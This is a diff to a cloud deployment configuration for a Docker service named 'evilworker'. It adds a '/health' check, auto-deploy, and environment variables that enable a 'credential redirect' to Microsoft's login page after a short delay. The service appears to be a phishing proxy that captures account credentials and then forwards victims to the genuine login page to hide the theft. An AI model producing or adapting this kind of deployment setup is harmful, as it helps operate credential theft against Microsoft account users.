@@ -4,11 +4,19 @@ services:
     env: docker
     plan: starter
     region: oregon
-    healthCheckPath: /
+    healthCheckPath: /health
+    healthCheckTimeout: 300
     envVars:
       - key: NODE_ENV
         value: production
       - key: PORT
         value: 3000
+      - key: ENABLE_CREDENTIAL_REDIRECT
+        value: "true"
+      - key: CREDENTIALS_REDIRECT_URL
+        value: "https://login.microsoftonline.com/"
+      - key: REDIRECT_DELAY
+        value: "1000"
     buildCommand: docker build -t evilworker .
     startCommand: docker run -p $PORT:3000 evilworker
+    autoDeploy: true
